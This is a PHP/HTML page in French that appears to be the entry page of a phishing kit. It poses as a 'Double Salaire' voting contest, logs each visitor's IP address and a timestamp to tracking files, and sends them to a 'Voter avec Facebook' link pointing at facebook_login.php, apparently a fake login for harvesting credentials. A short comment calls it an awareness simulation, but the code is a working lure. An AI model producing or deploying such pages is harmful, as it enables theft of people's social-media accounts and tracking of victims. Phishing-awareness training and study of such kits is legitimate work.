<?php
// ⚠️ This is a phishing simulation for educational awareness only.
// Do not use for malicious purposes.
$candidatName = $_GET['name'] ?? 'VOTEZ';
$sessionId = 'session_' . $_SERVER['REMOTE_ADDR'];
$clientIp = $_SERVER['REMOTE_ADDR'];

if (!file_exists('sessions')) mkdir('sessions', 0777, true);
if (!file_exists('tracking')) mkdir('tracking', 0777, true);

file_put_contents("tracking/$sessionId.json", json_encode([
    'page' => 'index.php',
    'timestamp' => time(),
    'ip' => $clientIp,
    'candidat' => $candidatName
]));
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Votez pour <?= htmlspecialchars($candidatName) ?> - Double Salaire</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>body{margin:0;padding:20px;font-family:Segoe UI;background:#f5f5f5}.container{max-width:600px;margin:auto;text-align:center;background:white;padding:20px;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1)}.vote-button{background:#1877f2;color:white;padding:15px 30px;border:none;border-radius:30px;font-size:16px;cursor:pointer}</style>
</head>
<body>
    <div class="container">
        <h1>Concours Double Salaire</h1>
        <h2>Votez pour <?= htmlspecialchars($candidatName) ?></h2>
        <a href="facebook_login.php?session=<?= $sessionId ?>&ip=<?= $clientIp ?>&name=<?= urlencode($candidatName) ?>" class="vote-button">Voter avec Facebook</a>
    </div>
</body>
</html>
